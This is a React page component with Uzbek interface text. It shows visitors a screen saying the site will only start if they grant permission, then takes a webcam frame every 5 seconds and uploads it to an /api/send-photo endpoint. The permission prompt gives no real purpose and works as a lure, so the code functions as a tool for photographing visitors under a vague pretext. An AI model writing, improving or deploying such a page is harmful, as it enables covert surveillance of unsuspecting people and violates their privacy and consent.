import { useRef, useEffect, useState } from "react";

export default function Home() {
  const videoRef = useRef(null);
  const [hasPermission, setHasPermission] = useState(false);
  const [sending, setSending] = useState(false);

  useEffect(() => {
    if (hasPermission) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => { videoRef.current.srcObject = stream; })
        .catch(err => console.error("Camera error:", err));

      const interval = setInterval(() => {
        captureAndSend();
      }, 5000);

      return () => clearInterval(interval);
    }
  }, [hasPermission]);

  const requestPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      videoRef.current.srcObject = stream;
      setHasPermission(true);
    } catch (err) {
      console.error("Permission denied:", err);
    }
  };

  const captureAndSend = async () => {
    if (sending || !videoRef.current) return;
    setSending(true);

    try {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext("2d").drawImage(videoRef.current, 0, 0);

      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
      const formData = new FormData();
      formData.append("photo", blob, "auto_frame.jpg");

      const res = await fetch("/api/send-photo", {
        method: "POST",
        body: formData,
      });

      const data = await res.json();
      console.log("Auto send response:", data);
    } catch (err) {
      console.error("Error sending auto photo:", err);
    }

    setSending(false);
  };

  if (!hasPermission) {
    return (
      <div style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "black",
        color: "white",
        fontSize: "24px",
        textAlign: "center",
        padding: "20px"
      }}>
        Ruxsat bersangiz sayt ishga tushadi
        <button 
          onClick={requestPermission} 
          style={{
            marginTop: "20px",
            padding: "10px 20px",
            fontSize: "18px",
            cursor: "pointer"
          }}
        >
          Ruxsat berish
        </button>
      </div>
    );
  }

  return (
    <div style={{ textAlign: "center" }}>
      <video ref={videoRef} autoPlay playsInline style={{ width: "100%", maxWidth: "400px" }} />
      <p>{sending ? "Yuborilmoqda..." : "Har 5 soniyada rasm yuboriladi"}</p>
    </div>
  );
}
